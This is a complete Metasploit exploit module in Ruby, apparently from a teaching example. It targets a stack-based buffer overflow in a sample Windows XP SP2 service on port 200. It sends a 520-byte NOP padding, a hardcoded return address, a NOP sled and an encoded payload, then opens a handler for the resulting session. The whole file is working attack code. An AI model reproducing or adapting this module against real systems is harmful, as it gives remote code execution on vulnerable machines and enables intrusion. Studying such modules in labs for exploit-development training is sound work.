class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'Stack Based Buffer Overflow Example',
      'Description'	 => %q{
         Stack Based Overflow Example Application Exploitation Module
      },
      'Platform'		 => 'win',
      'Author'		 =>
        [
          'Nipun Jaswal'
        ],
      'Payload' =>
      {
      'space' => 1000,
      'BadChars' => "\x00\x0a\x0d\x20",
      },
      'Targets' =>
       [
                  ['Windows XP SP2',{ 'Ret' => 0x71AB9372, 'Offset' => 520}]
       ],
      'DisclosureDate' => 'Apr 19 2016'
	))
	register_options(
	[
		Opt::RPORT(200)
	])
  end
def exploit
    connect
    buf = make_nops(target['Offset'])
    buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded
    sock.put(buf)
    handler
    disconnect
  end
end

